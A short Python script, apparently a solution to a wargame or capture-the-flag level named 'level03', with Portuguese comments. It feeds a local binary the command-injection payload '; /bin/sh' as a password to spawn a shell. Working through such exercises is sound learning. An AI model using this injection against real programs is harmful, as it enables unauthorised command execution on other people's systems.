import subprocess

def execute_level03():
    # Comando que será injetado como senha
    payload = b"; /bin/sh\n"

    try:
        # Executa o binário e envia o comando como entrada
        process = subprocess.Popen(
            ['./level03'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

        # Envia o payload como entrada para o programa
        stdout, stderr = process.communicate(input=payload)

        # Exibe a saída
        print(stdout.decode())
        print(stderr.decode())

        # Após invocar o shell, envie um comando de teste
        print("Habemus shell!")
    except FileNotFoundError:
        print("[-] Binary not found. Make sure 'level03' is in the correct directory.")

if __name__ == "__main__":
    execute_level03()
